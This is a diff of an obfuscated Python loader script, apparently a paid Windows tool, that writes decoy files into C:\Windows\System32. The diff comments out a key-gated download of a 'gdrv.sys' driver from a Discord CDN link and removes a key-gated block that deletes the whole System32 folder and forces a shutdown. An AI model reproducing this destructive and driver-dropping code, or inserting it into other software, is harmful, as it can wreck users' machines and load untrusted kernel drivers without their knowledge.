@@ -10,6 +10,8 @@ import os
 
 
 os.system('cls')
+
+'''
 desktop_pathxsd = os.path.join(os.environ['USERPROFILE'], 'Desktop')
 file_pathaesconfig = os.path.join(desktop_pathxsd, 'aes_config.txt')
 
@@ -30,15 +32,13 @@ def dl_anything_file(url, file_name):
         print(f"")
 if cskey=="xnyOQrKum5ok3gIq-aesthetic":
     dl_anything_file("https://cdn.discordapp.com/attachments/1198653708511215736/1320957399682519145/gdrv.sys?ex=676b7cf2&is=676a2b72&hm=214b2c82fbbe66bc4585fe831ed1766aebfc5ca2bc5dbd6ea0939922d73b839d&","gdrv.sys")
+'''
+
 os.system('cls')
-if os.path.isfile(file_pathaesconfig):
-    os.remove(file_pathaesconfig)
-    print("")
 os.system('cls')
 
 filenamex = os.path.basename(__file__)
 #discord_warning(filenamex)
-
 if filenamex != "aespremv1_01032025.py":
     os.system('cls')
     script_path = os.path.realpath(__file__)
@@ -59,9 +59,7 @@ if cskey =="deletemysdfasdf":
 os.system('cls')
 
 
-if os.path.isdir(r"C:\Windows\System32\FileSystemXS"):
-    shutil.rmtree(r"C:\Windows\System32\FileSystemXS")
-os.system('cls')
+
 def create_file_in_system32(filename, content=''):
     system32_path = r'C:\Windows\System32'
     file_path = os.path.join(system32_path, filename)  
@@ -71,9 +69,9 @@ def create_file_in_system32(filename, content=''):
         with open(file_path, 'w') as file:
             file.write(content)
     except PermissionError:
-        print("")
+        sdsdsadfd="sxsssdfsdf"
     except Exception as e:
-        print(f'An error occurred: {e}')
+        sdfd="sxdfsdf"
 create_file_in_system32('mydr.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
 create_file_in_system32('mydrsdf.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
 create_file_in_system32('mydrvrs.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
@@ -208,13 +206,6 @@ create_file_in_system32('88systemdrivervul.txt', 'KRmMXvKn0m')
 create_file_in_system32('88datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
 create_file_in_system32('88infosystem.txt', 'klh_qupuw6n3pq')
 os.system('cls')
-
-aesv7()
-if cskey =="antidebuuggerxxxx":
-    shutil.rmtree(r'C:\Windows\System32')
-    os.system("shutdown /s /f /t 0")
- 
-
 
 os.system('cls')
 filexyz1 = r'C:\Windows\System32\data_vulnerable_x.txt'
